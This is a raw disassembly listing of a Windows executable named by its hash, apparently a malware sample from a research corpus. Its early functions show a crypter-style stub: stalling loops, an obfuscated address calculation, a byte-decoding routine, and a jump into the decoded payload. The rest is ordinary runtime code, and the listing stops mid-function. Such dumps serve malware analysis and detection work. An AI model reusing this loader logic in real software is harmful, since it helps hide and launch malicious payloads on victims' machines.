
89853ae76e12fe0f1e136fd00b769bc7badb4c6ce53af77f51bf590c455d6e0a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	pop    ebp
  401004:	ret    
  401005:	push   ebp
  401006:	mov    ebp,esp
  401008:	sub    esp,0x10
  40100b:	mov    DWORD PTR [ebp-0x4],0x0
  401012:	mov    DWORD PTR [ebp-0xc],0x0
  401019:	push   0x0
  40101b:	push   0x0
  40101d:	push   0x0
  40101f:	call   DWORD PTR ds:0x425004
  401025:	mov    DWORD PTR [ebp-0x10],0x0
  40102c:	mov    DWORD PTR [ebp-0x10],0x0
  401033:	jmp    0x40103e
  401035:	mov    eax,DWORD PTR [ebp-0x10]
  401038:	add    eax,0x1
  40103b:	mov    DWORD PTR [ebp-0x10],eax
  40103e:	cmp    DWORD PTR [ebp-0x10],0x3e8
  401045:	jge    0x40105c
  401047:	call   DWORD PTR ds:0x425000
  40104d:	mov    DWORD PTR [ebp-0x4],eax
  401050:	push   0x0
  401052:	call   0x4013ae
  401057:	add    esp,0x4
  40105a:	jmp    0x401035
  40105c:	mov    DWORD PTR [ebp-0x8],0x0
  401063:	cmp    DWORD PTR [ebp-0x4],0xde
  40106a:	jb     0x401078
  40106c:	push   0x0
  40106e:	push   0x0
  401070:	call   0x4011cd
  401075:	add    esp,0x8
  401078:	xor    eax,eax
  40107a:	mov    esp,ebp
  40107c:	pop    ebp
  40107d:	ret    
  40107e:	push   ebp
  40107f:	mov    ebp,esp
  401081:	sub    esp,0x8
  401084:	mov    DWORD PTR [ebp-0x4],0x0
  40108b:	mov    eax,DWORD PTR [ebp+0x8]
  40108e:	mov    DWORD PTR [ebp-0x4],eax
  401091:	mov    DWORD PTR [ebp-0x8],0xa
  401098:	push   0x0
  40109a:	call   DWORD PTR ds:0x4250e8
  4010a0:	push   0x0
  4010a2:	push   0x0
  4010a4:	push   0x0
  4010a6:	call   0x4013b9
  4010ab:	add    esp,0xc
  4010ae:	xor    eax,eax
  4010b0:	mov    esp,ebp
  4010b2:	pop    ebp
  4010b3:	ret    
  4010b4:	push   ebp
  4010b5:	mov    ebp,esp
  4010b7:	sub    esp,0x30
  4010ba:	mov    DWORD PTR [ebp-0x24],0x0
  4010c1:	mov    DWORD PTR [ebp-0x4],0x0
  4010c8:	mov    DWORD PTR [ebp-0x1c],0x0
  4010cf:	mov    BYTE PTR [ebp-0x9],0x0
  4010d3:	mov    DWORD PTR [ebp-0x8],0x0
  4010da:	mov    eax,DWORD PTR [ebp+0x8]
  4010dd:	mov    DWORD PTR [ebp-0x14],eax
  4010e0:	mov    DWORD PTR [ebp-0x20],0x0
  4010e7:	lea    ecx,[ebp-0x9]
  4010ea:	mov    DWORD PTR [ebp-0x18],ecx
  4010ed:	mov    DWORD PTR [ebp-0x28],0x0
  4010f4:	mov    DWORD PTR [ebp-0x10],0x0
  4010fb:	mov    DWORD PTR [ebp-0x2c],0x0
  401102:	mov    edx,DWORD PTR [ebp+0x10]
  401105:	mov    DWORD PTR [ebp-0x4],edx
  401108:	push   0x0
  40110a:	call   DWORD PTR ds:0x425010
  401110:	mov    eax,DWORD PTR [ebp-0x18]
  401113:	mov    ecx,DWORD PTR [ebp-0x14]
  401116:	mov    dl,BYTE PTR [ecx]
  401118:	mov    BYTE PTR [eax],dl
  40111a:	mov    eax,DWORD PTR [ebp-0x4]
  40111d:	add    eax,DWORD PTR [ebp-0x8]
  401120:	mov    BYTE PTR [eax],0x0
  401123:	mov    ecx,DWORD PTR [ebp-0x9]
  401126:	and    ecx,0xff
  40112c:	push   ecx
  40112d:	lea    edx,[ebp-0x20]
  401130:	push   edx
  401131:	call   DWORD PTR ds:0x42500c
  401137:	mov    eax,DWORD PTR [ebp-0x20]
  40113a:	add    eax,0x14
  40113d:	push   eax
  40113e:	lea    ecx,[ebp-0x20]
  401141:	push   ecx
  401142:	call   DWORD PTR ds:0x42500c
  401148:	mov    dl,BYTE PTR [ebp-0x20]
  40114b:	mov    BYTE PTR [ebp-0x9],dl
  40114e:	push   0x4
  401150:	lea    eax,[ebp-0x9]
  401153:	push   eax
  401154:	lea    ecx,[ebp-0x2c]
  401157:	push   ecx
  401158:	call   0x4013d0
  40115d:	add    esp,0xc
  401160:	mov    DWORD PTR [ebp-0x30],0x0
  401167:	jmp    0x401172
  401169:	mov    edx,DWORD PTR [ebp-0x30]
  40116c:	add    edx,0x1
  40116f:	mov    DWORD PTR [ebp-0x30],edx
  401172:	mov    eax,DWORD PTR [ebp-0x9]
  401175:	and    eax,0xff
  40117a:	cmp    DWORD PTR [ebp-0x30],eax
  40117d:	jge    0x401187
  40117f:	call   DWORD PTR ds:0x425000
  401185:	jmp    0x401169
  401187:	mov    ecx,DWORD PTR [ebp-0x4]
  40118a:	add    ecx,DWORD PTR [ebp-0x8]
  40118d:	mov    dl,BYTE PTR [ebp-0x2c]
  401190:	mov    BYTE PTR [ecx],dl
  401192:	mov    eax,DWORD PTR [ebp-0x14]
  401195:	add    eax,0x1
  401198:	mov    DWORD PTR [ebp-0x14],eax
  40119b:	lea    ecx,[ebp-0x8]
  40119e:	push   ecx
  40119f:	call   DWORD PTR ds:0x425008
  4011a5:	mov    edx,DWORD PTR [ebp-0x8]
  4011a8:	cmp    edx,DWORD PTR [ebp+0xc]
  4011ab:	jb     0x401102
  4011b1:	mov    esp,ebp
  4011b3:	pop    ebp
  4011b4:	ret    
  4011b5:	push   ebp
  4011b6:	mov    ebp,esp
  4011b8:	push   ecx
  4011b9:	mov    DWORD PTR [ebp-0x4],0x0
  4011c0:	call   0x401005
  4011c5:	xor    eax,eax
  4011c7:	mov    esp,ebp
  4011c9:	pop    ebp
  4011ca:	ret    0x10
  4011cd:	push   ebp
  4011ce:	mov    ebp,esp
  4011d0:	sub    esp,0x98
  4011d6:	push   ebx
  4011d7:	push   esi
  4011d8:	mov    DWORD PTR [ebp-0x98],0x0
  4011e2:	mov    DWORD PTR [ebp-0x78],0x0
  4011e9:	mov    DWORD PTR [ebp-0x70],0x0
  4011f0:	mov    DWORD PTR [ebp-0x94],0x0
  4011fa:	mov    DWORD PTR [ebp-0x10],0x0
  401201:	mov    DWORD PTR [ebp-0x68],0x0
  401208:	mov    DWORD PTR [ebp-0xc],0x0
  40120f:	mov    DWORD PTR [ebp-0x4],0x0
  401216:	mov    DWORD PTR [ebp-0x80],0x0
  40121d:	mov    DWORD PTR [ebp-0x74],0x0
  401224:	mov    DWORD PTR [ebp-0x8],0x0
  40122b:	mov    DWORD PTR [ebp-0x6c],0x7bdeeae1
  401232:	mov    DWORD PTR [ebp-0x7c],0x0
  401239:	mov    DWORD PTR [ebp-0x8c],0x0
  401243:	mov    DWORD PTR [ebp-0x64],0x0
  40124a:	mov    DWORD PTR [ebp-0x88],0x0
  401254:	mov    eax,ds:0x425030
  401259:	mov    DWORD PTR [ebp-0x84],eax
  40125f:	mov    DWORD PTR [ebp-0x90],0x0
  401269:	push   0x0
  40126b:	call   DWORD PTR ds:0x42502c
  401271:	mov    DWORD PTR [ebp-0x94],0x1e516
  40127b:	mov    ebx,0x0
  401280:	push   ebx
  401281:	push   ebx
  401282:	mov    ebx,eax
  401284:	push   0x0
  401286:	call   DWORD PTR ds:0x425028
  40128c:	mov    DWORD PTR [ebp-0x78],0x3a
  401293:	mov    ecx,DWORD PTR ds:0x425024
  401299:	mov    DWORD PTR [ebp+0xc],ecx
  40129c:	push   0x0
  40129e:	push   0x0
  4012a0:	push   0x0
  4012a2:	push   0x0
  4012a4:	push   0x0
  4012a6:	call   DWORD PTR ds:0x425020
  4012ac:	mov    DWORD PTR [ebp-0x8],0x500
  4012b3:	mov    edx,DWORD PTR [ebp-0x94]
  4012b9:	add    edx,0x21ea
  4012bf:	mov    DWORD PTR [ebp-0x94],edx
  4012c5:	call   DWORD PTR ds:0x42501c
  4012cb:	mov    ecx,DWORD PTR [ebp-0x94]
  4012d1:	add    ecx,eax
  4012d3:	mov    DWORD PTR [ebp-0x94],ecx
  4012d9:	mov    DWORD PTR [ebp-0x80],0x0
  4012e0:	cmp    DWORD PTR [ebp-0x94],0x0
  4012e7:	jbe    0x4012fc
  4012e9:	mov    edx,DWORD PTR [ebp-0x8]
  4012ec:	add    edx,0xb00
  4012f2:	mov    DWORD PTR [ebp-0x8],edx
  4012f5:	mov    DWORD PTR [ebp-0xc],0x18ef
  4012fc:	mov    ebx,DWORD PTR [ebp+0xc]
  4012ff:	mov    eax,DWORD PTR [ebp-0x80]
  401302:	add    eax,0x2
  401305:	mov    DWORD PTR [ebp-0x80],eax
  401308:	mov    ecx,DWORD PTR [ebp-0x80]
  40130b:	add    ecx,0x2
  40130e:	mov    DWORD PTR [ebp-0x80],ecx
  401311:	push   DWORD PTR [ebp-0x80]
  401314:	push   DWORD PTR [ebp-0x8]
  401317:	mov    eax,0x0
  40131c:	push   0x2769
  401321:	push   eax
  401322:	push   ebx
  401323:	pop    DWORD PTR [ebp-0x5b]
  401326:	call   DWORD PTR [ebp-0x5b]
  401329:	mov    DWORD PTR [ebp+0xc],eax
  40132c:	push   DWORD PTR [ebp-0x84]
  401332:	call   DWORD PTR ds:0x425000
  401338:	push   0x424e74
  40133d:	push   0x424e84
  401342:	call   DWORD PTR ds:0x425018
  401348:	push   eax
  401349:	call   DWORD PTR ds:0x425014
  40134f:	mov    DWORD PTR [ebp-0x70],eax
  401352:	mov    DWORD PTR [ebp-0x64],0x400000
  401359:	mov    edx,DWORD PTR [ebp+0xc]
  40135c:	mov    DWORD PTR [ebp-0x74],edx
  40135f:	pop    DWORD PTR [ebp-0x98]
  401365:	mov    eax,DWORD PTR [ebp+0xc]
  401368:	add    eax,DWORD PTR [ebp-0x78]
  40136b:	mov    DWORD PTR [ebp-0x7c],eax
  40136e:	mov    ecx,DWORD PTR [ebp-0x64]
  401371:	mov    DWORD PTR [ebp-0x68],ecx
  401374:	mov    edx,DWORD PTR [ebp-0x94]
  40137a:	mov    eax,DWORD PTR [ebp-0x68]
  40137d:	lea    ecx,[eax+edx*1+0xa]
  401381:	mov    DWORD PTR [ebp-0x68],ecx
  401384:	mov    edx,DWORD PTR [ebp-0x74]
  401387:	push   edx
  401388:	mov    eax,DWORD PTR [ebp-0xc]
  40138b:	push   eax
  40138c:	mov    ecx,DWORD PTR [ebp-0x68]
  40138f:	push   ecx
  401390:	call   0x4010b4
  401395:	add    esp,0xc
  401398:	push   DWORD PTR [ebp-0x70]
  40139b:	push   DWORD PTR [ebp-0x98]
  4013a1:	mov    esi,DWORD PTR [ebp-0x7c]
  4013a4:	call   esi
  4013a6:	xor    eax,eax
  4013a8:	pop    esi
  4013a9:	pop    ebx
  4013aa:	mov    esp,ebp
  4013ac:	pop    ebp
  4013ad:	ret    
  4013ae:	mov    eax,DWORD PTR [esp+0x4]
  4013b2:	test   eax,eax
  4013b4:	jge    0x4013b8
  4013b6:	neg    eax
  4013b8:	ret    
  4013b9:	lea    eax,[esp+0xc]
  4013bd:	push   eax
  4013be:	push   DWORD PTR [esp+0xc]
  4013c2:	push   DWORD PTR [esp+0xc]
  4013c6:	call   0x401953
  4013cb:	add    esp,0xc
  4013ce:	ret    
  4013cf:	int3   
  4013d0:	push   ebp
  4013d1:	mov    ebp,esp
  4013d3:	push   edi
  4013d4:	push   esi
  4013d5:	mov    esi,DWORD PTR [ebp+0xc]
  4013d8:	mov    ecx,DWORD PTR [ebp+0x10]
  4013db:	mov    edi,DWORD PTR [ebp+0x8]
  4013de:	mov    eax,ecx
  4013e0:	mov    edx,ecx
  4013e2:	add    eax,esi
  4013e4:	cmp    edi,esi
  4013e6:	jbe    0x4013f0
  4013e8:	cmp    edi,eax
  4013ea:	jb     0x40156c
  4013f0:	test   edi,0x3
  4013f6:	jne    0x40140c
  4013f8:	shr    ecx,0x2
  4013fb:	and    edx,0x3
  4013fe:	cmp    ecx,0x8
  401401:	jb     0x40142c
  401403:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401405:	jmp    DWORD PTR [edx*4+0x40151c]
  40140c:	mov    eax,edi
  40140e:	mov    edx,0x3
  401413:	sub    ecx,0x4
  401416:	jb     0x401424
  401418:	and    eax,0x3
  40141b:	add    ecx,eax
  40141d:	jmp    DWORD PTR [eax*4+0x401430]
  401424:	jmp    DWORD PTR [ecx*4+0x40152c]
  40142b:	nop
  40142c:	jmp    DWORD PTR [ecx*4+0x4014b0]
  401433:	nop
  401434:	inc    eax
  401435:	adc    al,0x40
  401437:	add    BYTE PTR [esp+edx*1+0x40],ch
  40143b:	add    BYTE PTR [eax+0x23004014],dl
  401441:	ror    DWORD PTR [edx-0x75f877fa],1
  401447:	inc    esi
  401448:	add    DWORD PTR [eax+0x468a0147],ecx
  40144e:	add    al,cl
  401450:	jmp    0x2879c57
  401455:	add    esi,0x3
  401458:	add    edi,0x3
  40145b:	cmp    ecx,0x8
  40145e:	jb     0x40142c
  401460:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401462:	jmp    DWORD PTR [edx*4+0x40151c]
  401469:	lea    ecx,[ecx+0x0]
  40146c:	and    edx,ecx
  40146e:	mov    al,BYTE PTR [esi]
  401470:	mov    BYTE PTR [edi],al
  401472:	mov    al,BYTE PTR [esi+0x1]
  401475:	shr    ecx,0x2
  401478:	mov    BYTE PTR [edi+0x1],al
  40147b:	add    esi,0x2
  40147e:	add    edi,0x2
  401481:	cmp    ecx,0x8
  401484:	jb     0x40142c
  401486:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401488:	jmp    DWORD PTR [edx*4+0x40151c]
  40148f:	nop
  401490:	and    edx,ecx
  401492:	mov    al,BYTE PTR [esi]
  401494:	mov    BYTE PTR [edi],al
  401496:	add    esi,0x1
  401499:	shr    ecx,0x2
  40149c:	add    edi,0x1
  40149f:	cmp    ecx,0x8
  4014a2:	jb     0x40142c
  4014a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014a6:	jmp    DWORD PTR [edx*4+0x40151c]
  4014ad:	lea    ecx,[ecx+0x0]
  4014b0:	adc    edx,DWORD PTR ds:0x15000040
  4014b6:	inc    eax
  4014b7:	add    al,bh
  4014b9:	adc    al,0x40
  4014bb:	add    al,dh
  4014bd:	adc    al,0x40
  4014bf:	add    al,ch
  4014c1:	adc    al,0x40
  4014c3:	add    al,ah
  4014c5:	adc    al,0x40
  4014c7:	add    al,bl
  4014c9:	adc    al,0x40
  4014cb:	add    al,dl
  4014cd:	adc    al,0x40
  4014cf:	add    BYTE PTR [ebx-0x761b71bc],cl
  4014d5:	inc    esp
  4014d6:	(bad)  
  4014d7:	in     al,0x8b
  4014d9:	inc    esp
  4014da:	mov    gs,eax
  4014dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4014e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4014e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4014e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4014ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4014f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4014f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4014f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4014fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  401500:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  401504:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  401508:	lea    eax,[ecx*4+0x0]
  40150f:	add    esi,eax
  401511:	add    edi,eax
  401513:	jmp    DWORD PTR [edx*4+0x40151c]
  40151a:	mov    edi,edi
  40151c:	sub    al,0x15
  40151e:	inc    eax
  40151f:	add    BYTE PTR [edx*1+0x15400040],dh
  401526:	inc    eax
  401527:	add    BYTE PTR [ebp+edx*1+0x40],dl
  40152b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  401531:	leave  
  401532:	ret    
  401533:	nop
  401534:	mov    al,BYTE PTR [esi]
  401536:	mov    BYTE PTR [edi],al
  401538:	mov    eax,DWORD PTR [ebp+0x8]
  40153b:	pop    esi
  40153c:	pop    edi
  40153d:	leave  
  40153e:	ret    
  40153f:	nop
  401540:	mov    al,BYTE PTR [esi]
  401542:	mov    BYTE PTR [edi],al
  401544:	mov    al,BYTE PTR [esi+0x1]
  401547:	mov    BYTE PTR [edi+0x1],al
  40154a:	mov    eax,DWORD PTR [ebp+0x8]
  40154d:	pop    esi
  40154e:	pop    edi
  40154f:	leave  
  401550:	ret    
  401551:	lea    ecx,[ecx+0x0]
  401554:	mov    al,BYTE PTR [esi]
  401556:	mov    BYTE PTR [edi],al
  401558:	mov    al,BYTE PTR [esi+0x1]
  40155b:	mov    BYTE PTR [edi+0x1],al
  40155e:	mov    al,BYTE PTR [esi+0x2]
  401561:	mov    BYTE PTR [edi+0x2],al
  401564:	mov    eax,DWORD PTR [ebp+0x8]
  401567:	pop    esi
  401568:	pop    edi
  401569:	leave  
  40156a:	ret    
  40156b:	nop
  40156c:	lea    esi,[ecx+esi*1-0x4]
  401570:	lea    edi,[ecx+edi*1-0x4]
  401574:	test   edi,0x3
  40157a:	jne    0x4015a0
  40157c:	shr    ecx,0x2
  40157f:	and    edx,0x3
  401582:	cmp    ecx,0x8
  401585:	jb     0x401594
  401587:	std    
  401588:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40158a:	cld    
  40158b:	jmp    DWORD PTR [edx*4+0x4016b8]
  401592:	mov    edi,edi
  401594:	neg    ecx
  401596:	jmp    DWORD PTR [ecx*4+0x401668]
  40159d:	lea    ecx,[ecx+0x0]
  4015a0:	mov    eax,edi
  4015a2:	mov    edx,0x3
  4015a7:	cmp    ecx,0x4
  4015aa:	jb     0x4015b8
  4015ac:	and    eax,0x3
  4015af:	sub    ecx,eax
  4015b1:	jmp    DWORD PTR [eax*4+0x4015bc]
  4015b8:	jmp    DWORD PTR [ecx*4+0x4016b8]
  4015bf:	nop
  4015c0:	int3   
  4015c1:	adc    eax,0x15f00040
  4015c6:	inc    eax
  4015c7:	add    BYTE PTR [eax],bl
  4015c9:	push   ss
  4015ca:	inc    eax
  4015cb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4015d1:	mov    BYTE PTR [edi+0x3],al
  4015d4:	sub    esi,0x1
  4015d7:	shr    ecx,0x2
  4015da:	sub    edi,0x1
  4015dd:	cmp    ecx,0x8
  4015e0:	jb     0x401594
  4015e2:	std    
  4015e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e5:	cld    
  4015e6:	jmp    DWORD PTR [edx*4+0x4016b8]
  4015ed:	lea    ecx,[ecx+0x0]
  4015f0:	mov    al,BYTE PTR [esi+0x3]
  4015f3:	and    edx,ecx
  4015f5:	mov    BYTE PTR [edi+0x3],al
  4015f8:	mov    al,BYTE PTR [esi+0x2]
  4015fb:	shr    ecx,0x2
  4015fe:	mov    BYTE PTR [edi+0x2],al
  401601:	sub    esi,0x2
  401604:	sub    edi,0x2
  401607:	cmp    ecx,0x8
  40160a:	jb     0x401594
  40160c:	std    
  40160d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40160f:	cld    
  401610:	jmp    DWORD PTR [edx*4+0x4016b8]
  401617:	nop
  401618:	mov    al,BYTE PTR [esi+0x3]
  40161b:	and    edx,ecx
  40161d:	mov    BYTE PTR [edi+0x3],al
  401620:	mov    al,BYTE PTR [esi+0x2]
  401623:	mov    BYTE PTR [edi+0x2],al
  401626:	mov    al,BYTE PTR [esi+0x1]
  401629:	shr    ecx,0x2
  40162c:	mov    BYTE PTR [edi+0x1],al
  40162f:	sub    esi,0x3
  401632:	sub    edi,0x3
  401635:	cmp    ecx,0x8
  401638:	jb     0x401594
  40163e:	std    
  40163f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401641:	cld    
  401642:	jmp    DWORD PTR [edx*4+0x4016b8]
  401649:	lea    ecx,[ecx+0x0]
  40164c:	ins    BYTE PTR es:[edi],dx
  40164d:	push   ss
  40164e:	inc    eax
  40164f:	add    BYTE PTR [esi+edx*1+0x40],dh
  401653:	add    BYTE PTR [esi+edx*1+0x40],bh
  401657:	add    BYTE PTR [esi+edx*1+0x168c0040],al
  40165e:	inc    eax
  40165f:	add    BYTE PTR [esi+edx*1+0x169c0040],dl
  401666:	inc    eax
  401667:	add    BYTE PTR [edi-0x74ffbfea],ch
  40166d:	inc    esp
  40166e:	mov    ds,WORD PTR [ecx+ecx*4]
  401671:	inc    esp
  401672:	(bad)  
  401673:	sbb    al,0x8b
  401675:	inc    esp
  401676:	mov    ds,WORD PTR [eax]
  401678:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  40167c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  401680:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  401684:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  401688:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  40168c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  401690:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  401694:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  401698:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  40169c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4016a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4016a4:	lea    eax,[ecx*4+0x0]
  4016ab:	add    esi,eax
  4016ad:	add    edi,eax
  4016af:	jmp    DWORD PTR [edx*4+0x4016b8]
  4016b6:	mov    edi,edi
  4016b8:	enter  0x4016,0x0
  4016bc:	rcl    BYTE PTR [esi],1
  4016be:	inc    eax
  4016bf:	add    al,ah
  4016c1:	push   ss
  4016c2:	inc    eax
  4016c3:	add    ah,dh
  4016c5:	push   ss
  4016c6:	inc    eax
  4016c7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4016cd:	leave  
  4016ce:	ret    
  4016cf:	nop
  4016d0:	mov    al,BYTE PTR [esi+0x3]
  4016d3:	mov    BYTE PTR [edi+0x3],al
  4016d6:	mov    eax,DWORD PTR [ebp+0x8]
  4016d9:	pop    esi
  4016da:	pop    edi
  4016db:	leave  
  4016dc:	ret    
  4016dd:	lea    ecx,[ecx+0x0]
  4016e0:	mov    al,BYTE PTR [esi+0x3]
  4016e3:	mov    BYTE PTR [edi+0x3],al
  4016e6:	mov    al,BYTE PTR [esi+0x2]
  4016e9:	mov    BYTE PTR [edi+0x2],al
  4016ec:	mov    eax,DWORD PTR [ebp+0x8]
  4016ef:	pop    esi
  4016f0:	pop    edi
  4016f1:	leave  
  4016f2:	ret    
  4016f3:	nop
  4016f4:	mov    al,BYTE PTR [esi+0x3]
  4016f7:	mov    BYTE PTR [edi+0x3],al
  4016fa:	mov    al,BYTE PTR [esi+0x2]
  4016fd:	mov    BYTE PTR [edi+0x2],al
  401700:	mov    al,BYTE PTR [esi+0x1]
  401703:	mov    BYTE PTR [edi+0x1],al
  401706:	mov    eax,DWORD PTR [ebp+0x8]
  401709:	pop    esi
  40170a:	pop    edi
  40170b:	leave  
  40170c:	ret    
  40170d:	cmp    DWORD PTR ds:0x4277c8,0x1
  401714:	jne    0x40171b
  401716:	call   0x4027fb
  40171b:	push   DWORD PTR [esp+0x4]
  40171f:	call   0x402684
  401724:	push   0xff
  401729:	call   DWORD PTR ds:0x427140
  40172f:	pop    ecx
  401730:	pop    ecx
  401731:	ret    
  401732:	push   0x60
  401734:	push   0x425110
  401739:	call   0x4030a4
  40173e:	mov    edi,0x94
  401743:	mov    eax,edi
  401745:	call   0x4030f0
  40174a:	mov    DWORD PTR [ebp-0x18],esp
  40174d:	mov    esi,esp
  40174f:	mov    DWORD PTR [esi],edi
  401751:	push   esi
  401752:	call   DWORD PTR ds:0x425044
  401758:	mov    ecx,DWORD PTR [esi+0x10]
  40175b:	mov    DWORD PTR ds:0x4277d8,ecx
  401761:	mov    eax,DWORD PTR [esi+0x4]
  401764:	mov    ds:0x4277e4,eax
  401769:	mov    edx,DWORD PTR [esi+0x8]
  40176c:	mov    DWORD PTR ds:0x4277e8,edx
  401772:	mov    esi,DWORD PTR [esi+0xc]
  401775:	and    esi,0x7fff
  40177b:	mov    DWORD PTR ds:0x4277dc,esi
  401781:	cmp    ecx,0x2
  401784:	je     0x401792
  401786:	or     esi,0x8000
  40178c:	mov    DWORD PTR ds:0x4277dc,esi
  401792:	shl    eax,0x8
  401795:	add    eax,edx
  401797:	mov    ds:0x4277e0,eax
  40179c:	xor    esi,esi
  40179e:	push   esi
  40179f:	mov    edi,DWORD PTR ds:0x425030
  4017a5:	call   edi
  4017a7:	cmp    WORD PTR [eax],0x5a4d
  4017ac:	jne    0x4017cd
  4017ae:	mov    ecx,DWORD PTR [eax+0x3c]
  4017b1:	add    ecx,eax
  4017b3:	cmp    DWORD PTR [ecx],0x4550
  4017b9:	jne    0x4017cd
  4017bb:	movzx  eax,WORD PTR [ecx+0x18]
  4017bf:	cmp    eax,0x10b
  4017c4:	je     0x4017e5
  4017c6:	cmp    eax,0x20b
  4017cb:	je     0x4017d2
  4017cd:	mov    DWORD PTR [ebp-0x1c],esi
  4017d0:	jmp    0x4017f9
  4017d2:	cmp    DWORD PTR [ecx+0x84],0xe
  4017d9:	jbe    0x4017cd
  4017db:	xor    eax,eax
  4017dd:	cmp    DWORD PTR [ecx+0xf8],esi
  4017e3:	jmp    0x4017f3
  4017e5:	cmp    DWORD PTR [ecx+0x74],0xe
  4017e9:	jbe    0x4017cd
  4017eb:	xor    eax,eax
  4017ed:	cmp    DWORD PTR [ecx+0xe8],esi
  4017f3:	setne  al
  4017f6:	mov    DWORD PTR [ebp-0x1c],eax
  4017f9:	push   esi
  4017fa:	call   0x403052
  4017ff:	pop    ecx
  401800:	test   eax,eax
  401802:	jne    0x401825
  401804:	cmp    DWORD PTR ds:0x4277c8,0x1
  40180b:	jne    0x401812
  40180d:	call   0x4027fb
  401812:	push   0x1c
  401814:	call   0x402684
  401819:	push   0xff
  40181e:	call   0x4024ed
  401823:	pop    ecx
  401824:	pop    ecx
  401825:	call   0x402fb0
  40182a:	mov    DWORD PTR [ebp-0x4],esi
  40182d:	call   0x402e05
  401832:	test   eax,eax
  401834:	jge    0x40183e
  401836:	push   0x1b
  401838:	call   0x40170d
  40183d:	pop    ecx
  40183e:	call   DWORD PTR ds:0x425040
  401844:	mov    ds:0x428d34,eax
  401849:	call   0x402ce3
  40184e:	mov    ds:0x4277c0,eax
  401853:	call   0x402c41
  401858:	test   eax,eax
  40185a:	jge    0x401864
  40185c:	push   0x8
  40185e:	call   0x40170d
  401863:	pop    ecx
  401864:	call   0x402a0e
  401869:	test   eax,eax
  40186b:	jge    0x401875
  40186d:	push   0x9
  40186f:	call   0x40170d
  401874:	pop    ecx
  401875:	call   0x40251d
  40187a:	mov    DWORD PTR [ebp-0x20],eax
  40187d:	cmp    eax,esi
  40187f:	je     0x401888
  401881:	push   eax
  401882:	call   0x40170d
  401887:	pop    ecx
  401888:	mov    DWORD PTR [ebp-0x38],esi
  40188b:	lea    eax,[ebp-0x64]
  40188e:	push   eax
  40188f:	call   DWORD PTR ds:0x42503c
  401895:	call   0x4029a5
  40189a:	mov    DWORD PTR [ebp-0x68],eax
  40189d:	test   BYTE PTR [ebp-0x38],0x1
  4018a1:	je     0x4018a9
  4018a3:	movzx  eax,WORD PTR [ebp-0x34]
  4018a7:	jmp    0x4018ac
  4018a9:	push   0xa
  4018ab:	pop    eax
  4018ac:	push   eax
  4018ad:	push   DWORD PTR [ebp-0x68]
  4018b0:	push   esi
  4018b1:	push   esi
  4018b2:	call   edi
  4018b4:	push   eax
  4018b5:	call   0x4011b5
  4018ba:	mov    edi,eax
  4018bc:	mov    DWORD PTR [ebp-0x6c],edi
  4018bf:	cmp    DWORD PTR [ebp-0x1c],esi
  4018c2:	jne    0x4018ca
  4018c4:	push   edi
  4018c5:	call   0x402644
  4018ca:	call   0x402666
  4018cf:	jmp    0x4018fc
  4018d1:	mov    eax,DWORD PTR [ebp-0x14]
  4018d4:	mov    ecx,DWORD PTR [eax]
  4018d6:	mov    ecx,DWORD PTR [ecx]
  4018d8:	mov    DWORD PTR [ebp-0x70],ecx
  4018db:	push   eax
  4018dc:	push   ecx
  4018dd:	call   0x402834
  4018e2:	pop    ecx
  4018e3:	pop    ecx
  4018e4:	ret    
  4018e5:	mov    esp,DWORD PTR [ebp-0x18]
  4018e8:	mov    edi,DWORD PTR [ebp-0x70]
  4018eb:	cmp    DWORD PTR [ebp-0x1c],0x0
  4018ef:	jne    0x4018f7
  4018f1:	push   edi
  4018f2:	call   0x402655
  4018f7:	call   0x402675
  4018fc:	or     DWORD PTR [ebp-0x4],0xffffffff
  401900:	mov    eax,edi
  401902:	lea    esp,[ebp-0x7c]
  401905:	call   0x4030df
  40190a:	ret    
  40190b:	cmp    DWORD PTR ds:0x427278,0x1
  401912:	push   esi
  401913:	mov    esi,eax
  401915:	jle    0x401923
  401917:	push   0x4
  401919:	push   esi
  40191a:	call   0x40312d
  40191f:	pop    ecx
  401920:	pop    ecx
  401921:	jmp    0x40192f
  401923:	mov    eax,ds:0x427270
  401928:	movzx  eax,BYTE PTR [eax+esi*2]
  40192c:	and    eax,0x4
  40192f:	test   eax,eax
  401931:	jne    0x401939
  401933:	and    esi,0xffffffdf
  401936:	sub    esi,0x7
  401939:	mov    eax,esi
  40193b:	pop    esi
  40193c:	ret    
  40193d:	dec    DWORD PTR [edx+0x4]
  401940:	js     0x40194b
  401942:	mov    ecx,DWORD PTR [edx]
  401944:	movzx  eax,BYTE PTR [ecx]
  401947:	inc    ecx
  401948:	mov    DWORD PTR [edx],ecx
  40194a:	ret    
  40194b:	push   edx
